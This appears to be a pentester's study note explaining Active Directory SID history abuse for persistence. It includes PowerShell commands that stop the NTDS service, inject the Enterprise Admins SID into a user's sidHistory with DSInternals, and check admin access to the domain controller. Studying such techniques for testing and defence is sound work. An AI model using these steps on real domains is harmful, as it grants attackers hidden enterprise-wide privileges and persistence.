#powershell 
- [SID 1](../../Windows/Windows%20Internals/Security/SID%201.md) is used to track the security principal for an account.
- SID history is used to track previous SIDs of the user (maybe while migrating the AD environment to a new one). This allows the user to access resource in the previous/last domain using the new account.
- SID history, by design, can story any SID, and doesn't need to be from other domain.
- With domain admin privileges, we can add/modify SIDs to the SID history property of a user object.
- When the user logs in, the SIDs are added to their access token, which determines the privilege of the user.
- This can be exploited for persistence as we can add the SID of an enterprise admin, as this would elevate the privilege of the user, even though we are not added to the Enterprise Admin group.
- SID property can fetched with AD module:
```powershell
Get-ADUser dr.dragon -Properties sidhistory
# empty by default
```
- Adding SID history using DSInternals
```powershell
# Fetch SID for Enterprise Admins
Get-ADGroup "Enterprise Admins" -Property SID
# Stoping the ntds service
Stop-Service -Name ntds -Force
# Adding the SID history
Add-ADDBSidHistory -SamAccountName "dr.dragon" -SidHistory 'ADMIN_SID' -DatabasePath C:\Windows\NTDS\ntds.dit
# Start the ntds service again
Start-Service -Name ntds
# Verify Enterprise Admin access
dir \\dc.mydomain.local\C$
```